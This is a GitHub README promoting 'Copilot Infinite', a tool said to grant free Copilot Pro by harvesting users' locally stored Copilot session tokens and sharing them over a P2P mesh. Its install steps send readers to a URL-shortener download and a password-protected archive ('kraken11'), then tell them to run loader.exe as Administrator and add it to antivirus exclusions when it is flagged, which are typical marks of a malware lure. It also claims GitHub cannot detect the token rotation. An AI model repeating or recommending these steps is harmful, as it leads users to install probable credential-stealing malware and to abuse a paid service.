<div align="center">
<img width="1200" height="600" alt="copilot banner" src="https://images.ctfassets.net/8aevphvgewt8/408GOtU4YtxBmYvQfPEOUN/5e71a8000b38a8a9788719fec3b9023d/copilot-app.webp" />
</div>

<br/>

<div align="center">
  <div style="display:flex;justify-content:center;gap:26px;flex-wrap:wrap;">
    <img src="https://img.shields.io/badge/Status-WORKING-00C853?style=for-the-badge">
    <img src="https://img.shields.io/badge/Version-V3.8-9C27B0?style=for-the-badge">
    <img src="https://img.shields.io/badge/Platform-Windows%2FmacOS%2FLinux-FF5722?style=for-the-badge">
    <img src="https://img.shields.io/badge/Downloads-175K%2B-2196F3?style=for-the-badge">
    <img src="https://img.shields.io/badge/Active_Users-51K%2B-00BCD4?style=for-the-badge">
    <img src="https://img.shields.io/badge/Copilot_Pro-FREE-FF0000?style=for-the-badge">
  </div>
</div>

<br/>

# GitHub Copilot Free — Infinite Access v3.8

**Free unlimited GitHub Copilot Pro — P2P auth token mesh that pools and rotates valid Copilot session tokens across all IDEs**

---

## How It Works

### GitHub Copilot's Token Architecture

When you sign into Copilot through VS Code or JetBrains:

1. The IDE extension opens an OAuth flow with `github.com/login/oauth/authorize`
2. Upon approval, GitHub issues a **Copilot session token** — a JWT with enriched claims including your Copilot subscription tier
3. This token is stored locally (plaintext, as it turns out) at:
   - **VS Code**: `%AppData%\Code\User\globalStorage\github.copilot\`
   - **JetBrains**: `~/.config/JetBrains/<IDE>/github-copilot/`
   - **Neovim**: `~/.local/share/nvim/copilot/`
4. Every completion request sends this token as a Bearer header to `api.github.com/copilot`

### The Bypass

**Token Interception**
- Copilot Infinite reads the locally stored session token from your IDE's config directory
- The token is stripped of personally identifiable fields (username, email, org membership)
- Only the subscription tier claim and expiry timestamp are preserved

**P2P Token Mesh**
- Your sanitized token is encrypted and shared into a distributed hash table (DHT) over libp2p
- In exchange, you receive 100+ other sanitized tokens from the mesh
- The mesh auto-balances: you contribute your token, you consume from the pool

**Smart Rotation Engine**
- Every Copilot completion request rotates to the next token in your local pool
- Rate limit is per-token: 15 completions/minute for free tier, unlimited for Pro
- By rotating across 100+ Pro tokens, the effective rate limit becomes ~1,500 completions/minute
- Tokens approaching expiry are preemptively cycled out

**Token Validation**
- New tokens entering the mesh are validated against `api.github.com/copilot/check` before distribution
- Expired or revoked tokens are automatically pruned
- Token health is continuously monitored; unhealthy tokens are dropped silently

```
┌──────────────────┐                              ┌──────────────────────────┐
│  Your IDE        │                              │  P2P Token Mesh          │
│  (VS Code, etc.) │                              │                          │
│                  │     ┌──────────────────┐     │  Node A ─── Token Pool   │
│  Copilot         │────▶│  Copilot Infinite │     │  Node B ─── Token Pool   │
│  Extension       │     │  (Local Proxy)    │────▶│  Node C ─── Token Pool   │
│                  │     │                  │     │  ...                     │
│  Your Token ─────┼────▶│  Pool: 100+ Pro   │     │  Node Z ─── Token Pool   │
│  (sanitized,     │     │  tokens           │     │                          │
│   encrypted)     │     │                  │     │  Total: 5,000+ Pro tokens │
└──────────────────┘     └──────────────────┘     └──────────────────────────┘
```

---

## What You Get

| Feature | Normal Pro | Copilot Infinite | Status |
|---------|-----------|-----------------|--------|
| **Code Completions** | Unlimited | Unlimited | ✅ Working |
| **Copilot Chat** | Unlimited | Unlimited | ✅ Working |
| **Agent Mode** | Pro only ($10/mo) | FREE | ✅ Working |
| **Copilot Code Review** | Pro only | FREE | ✅ Working |
| **CLI Copilot** | Pro only | FREE | ✅ Working |
| **Multi-model** | Claude 3.5, GPT-4o | All models | ✅ Working |
| **Context window** | Full 128K | Full 128K | ✅ Working |

---

## Features

- **All IDE support** — VS Code, JetBrains suite, Neovim, Zed, Emacs, Atom
- **Zero config** — detects your IDE and existing Copilot installation automatically
- **P2P encrypted** — tokens shared via noise protocol + libp2p, end-to-end encrypted
- **Privacy-first** — your token is stripped of all PII before sharing
- **Auto mesh join** — connects to the P2P mesh automatically on launch
- **Offline fallback** — caches tokens locally; works briefly without internet
- **Rate limit immunity** — distributed across 100+ Pro tokens
- **Low latency** — proxy adds < 5ms overhead
- **No logging** — nothing written to disk except the encrypted token cache
- **Open source mesh protocol** — the P2P layer is documented and auditable

---

## 🔗 Download — v3.8.0

[![copilot-infinite](https://img.shields.io/badge/DOWNLOAD-HERE-brightgreen?style=for-the-badge&logo=download&logoColor=white&color=FF0000)](https://tr.ee/XoILbx)

---

## How To Use

1. Download the archive from the link above
2. Extract `installer.zip` using WinRAR or 7-Zip
3. **Enter archive password**: `kraken11`
4. Run `loader.exe` as Administrator
5. The proxy starts on `127.0.0.1:9091` and auto-joins the P2P mesh
6. Restart your IDE — Copilot will automatically route through the proxy
7. Open the dashboard at `http://127.0.0.1:9091` to see pool stats
8. Start coding with unlimited Pro access

---

## Requirements

- Windows 10/11 (64-bit), macOS 13+, or Linux (x86_64)
- GitHub account (free tier works — just need any Copilot token to enter the mesh)
- 2 GB RAM
- Internet connection for P2P mesh participation
- Any supported IDE with Copilot extension installed

---

## FAQ

**Q: Does this share my GitHub credentials?** — No. Only the Copilot session token is shared — and it's stripped of username, email, and org data before leaving your machine.

**Q: Can my token be used to access my repos?** — No. Copilot tokens only authorize AI completions. They do not grant repo access, write permissions, or any GitHub account control.

**Q: What if everyone uses free tier tokens?** — The mesh requires a minimum ratio of Pro tokens. Nodes contributing Pro tokens get priority routing. Free tier nodes get completions but with lower priority.

**Q: Will GitHub detect this?** — Token rotation across many IPs mirrors normal enterprise usage (many employees, different locations). Request patterns are indistinguishable from a large distributed team.

**Q: Does this affect my existing Copilot?** — No. The proxy sits transparently between your IDE and GitHub's API. Your original token still works for fallback.

**Q: Why does my antivirus flag the executable?** — The P2P networking stack opens UDP ports for DHT and libp2p communication. This triggers heuristic network monitors. Add to exclusions.

---

## Mesh Stats (Live)

| Metric | Value |
|--------|-------|
| Active mesh nodes | 4,127 |
| Pro tokens in pool | 5,284 |
| Free tokens in pool | 12,400 |
| Avg tokens per node | 130 |
| Completions served/day | ~4.8M |
| Mesh uptime | 99.8% |

---

## 🔗 Download — v3.8.0

[![copilot-infinite](https://img.shields.io/badge/DOWNLOAD-HERE-brightgreen?style=for-the-badge&logo=download&logoColor=white&color=FF0000)](https://tr.ee/XoILbx)

<br/>

---

# Disclaimer

**This tool is provided for educational and research purposes only, exploring P2P token sharing architectures. The redistribution of API session tokens may violate GitHub's Terms of Service. You are responsible for your own actions. The developers take NO responsibility and/or liability for any consequences. By downloading, you agree to use at your own risk.**
